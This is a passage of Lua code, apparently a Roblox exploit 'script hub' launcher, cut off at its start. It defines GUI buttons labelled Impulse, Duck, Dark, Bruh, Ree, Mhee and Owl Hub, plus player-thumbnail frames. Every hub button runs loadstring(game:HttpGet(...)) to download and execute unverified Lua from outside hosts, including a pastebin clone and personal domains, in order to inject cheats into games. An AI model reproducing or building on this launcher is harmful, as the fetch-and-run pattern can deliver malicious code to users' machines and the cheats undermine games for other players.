	loadstring(game:HttpGet('http://impulse-hub.xyz/ImpulseHub',true))()
end)

UICorner_60.Parent = Impulse

Duck.Name = "Duck"
Duck.Parent = Hubs
Duck.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Duck.Position = UDim2.new(0, 0, 0.42555064, 0)
Duck.Size = UDim2.new(0, 71, 0, 50)
Duck.Font = Enum.Font.SciFi
Duck.Text = "Duck Hub"
Duck.TextColor3 = Color3.fromRGB(0, 0, 0)
Duck.TextScaled = true
Duck.TextSize = 14.000
Duck.TextWrapped = true
Duck.MouseButton1Click:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/NougatBitz/DuckHub/master/window.lua'))()
end)

UICorner_61.Parent = Duck

Dark.Name = "Dark"
Dark.Parent = Hubs
Dark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Dark.Position = UDim2.new(0.56349206, 0, 0.214580178, 0)
Dark.Size = UDim2.new(0, 71, 0, 50)
Dark.Font = Enum.Font.SciFi
Dark.Text = "Dark Hub"
Dark.TextColor3 = Color3.fromRGB(0, 0, 0)
Dark.TextScaled = true
Dark.TextSize = 14.000
Dark.TextWrapped = true
Dark.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init'), true))()
end)

UICorner_62.Parent = Dark

Bruh.Name = "Bruh"
Bruh.Parent = Hubs
Bruh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bruh.Position = UDim2.new(0.28174603, 0, 0.214580178, 0)
Bruh.Size = UDim2.new(0, 71, 0, 50)
Bruh.Font = Enum.Font.SciFi
Bruh.Text = "Bruh Hub"
Bruh.TextColor3 = Color3.fromRGB(0, 0, 0)
Bruh.TextScaled = true
Bruh.TextSize = 14.000
Bruh.TextWrapped = true
Bruh.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://bruh.keshsenpai.com/.lua"))()
end)

UICorner_63.Parent = Bruh

Ree.Name = "Ree"
Ree.Parent = Hubs
Ree.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Ree.Position = UDim2.new(0, 0, 0.214580178, 0)
Ree.Size = UDim2.new(0, 71, 0, 50)
Ree.Font = Enum.Font.SciFi
Ree.Text = "Ree Hub"
Ree.TextColor3 = Color3.fromRGB(0, 0, 0)
Ree.TextScaled = true
Ree.TextSize = 14.000
Ree.TextWrapped = true
Ree.MouseButton1Click:connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/botdevXD/ReeHub/main/ReeHub.lua", true))()
end)

UICorner_64.Parent = Ree

Mhee.Name = "Mhee"
Mhee.Parent = Hubs
Mhee.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Mhee.Position = UDim2.new(0.56349206, 0, 0.00360972108, 0)
Mhee.Size = UDim2.new(0, 71, 0, 50)
Mhee.Font = Enum.Font.SciFi
Mhee.Text = "Mhee Hub"
Mhee.TextColor3 = Color3.fromRGB(0, 0, 0)
Mhee.TextScaled = true
Mhee.TextSize = 14.000
Mhee.TextWrapped = true
Mhee.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebinp.com/raw/Av8NMSSq",true))()
end)

UICorner_65.Parent = Mhee

Owl.Name = "Owl"
Owl.Parent = Hubs
Owl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Owl.Position = UDim2.new(0.28174603, 0, 0.00360972108, 0)
Owl.Size = UDim2.new(0, 71, 0, 50)
Owl.Font = Enum.Font.SciFi
Owl.Text = "Owl Hub"
Owl.TextColor3 = Color3.fromRGB(0, 0, 0)
Owl.TextScaled = true
Owl.TextSize = 14.000
Owl.TextWrapped = true
Owl.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/SiLeNSwOrD/OwlHub/master/OwlHub.txt'), true))()
end)

UICorner_66.Parent = Owl

-- HOME PICTURE--

local function MXDFV_fake_script()  
	local script = Instance.new('LocalScript', Home)

	local frame = script.Parent
	
	
	
	local player = game.Players.LocalPlayer
	
	
	
	local userId = player.UserId
	
	local thumbType = Enum.ThumbnailType.HeadShot
	
	local thumbSize = Enum.ThumbnailSize.Size420x420
	
	local content, isReady = game.Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
	
	
	
	
	
	frame.PlayerImage.Image = content
	
	frame.PlayerName.Text = player.Name
end
coroutine.wrap(MXDFV_fake_script)()
-- XGL1CH PICTURE --
local function TDNKWXA_fake_script()  
	local script = Instance.new('LocalScript', Credits)

	local frame = script.Parent
	
	
	
	local player = game.Players.LocalPlayer
	
	
	
	local userId = 3219105085
	
	local thumbType = Enum.ThumbnailType.HeadShot
	
	local thumbSize = Enum.ThumbnailSize.Size420x420
	
	local content, isReady = game.Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
	
	
	
	
	
	frame.DeveloperPic.Image = content
end
coroutine.wrap(TDNKWXA_fake_script)()

-- Draggable
Main.Draggable = true
Launcher.Draggable = true
